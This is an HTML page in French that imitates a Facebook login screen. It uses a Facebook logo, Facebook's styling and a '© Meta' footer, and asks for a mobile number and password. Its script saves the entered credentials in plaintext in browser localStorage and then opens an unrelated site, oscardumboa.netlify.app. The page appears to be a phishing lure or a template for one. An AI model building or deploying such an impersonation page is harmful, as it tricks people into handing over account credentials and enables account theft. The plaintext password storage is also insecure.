<!DOCTYPE html><html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connexion-facebook</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(45deg, #f6f0ff, #e0f7ff);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-container {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    .login-container img {
      width: 60px;
      margin-bottom: 1rem;
    }
    input {
      width: 100%;
      padding: 0.75rem;
      margin: 0.5rem 0;
      border: 1px solid #ccc;
      border-radius: 8px;
    }
    button {
      width: 100%;
      padding: 0.75rem;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 0.5rem;
    }
    .meta {
      margin-top: 2rem;
      color: gray;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://ucarecdn.com/4a492eb3-b012-48b5-956e-bd734c631e70/-/preview/1000x1000/" alt="Facebook Logo">
    <h2>Connexion </h2>
    <input type="number" id="email" placeholder="NumÃ©ro mobile ">
    <input type="password" id="password" placeholder="Mot de passe">
    <button onclick="loginOrCreate()">Se connecter</button>
    <div class="meta">
      <p>&copy; Meta</p>
    </div>
  </div>  <script>
    function loginOrCreate() {
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      if (!email || !password) return alert("Remplissez tous les champs");

      let users = JSON.parse(localStorage.getItem('users') || '[]');
      let user = users.find(u => u.email === email);

      if (user) {
        if (user.password === password) {
          localStorage.setItem('loggedInUser', JSON.stringify(user));
    window.open('https://oscardumboa.netlify.app', '_blank');
        } else {
          alert('Mot de passe incorrect');
        }
      } else {
        const newUser = { email, password };
        users.push(newUser);
        localStorage.setItem('users', JSON.stringify(users));
        localStorage.setItem('loggedInUser', JSON.stringify(newUser));
    window.open('https://oscardumboa.netlify.app', '_blank');
      }
    }
  </script></body>
</html>
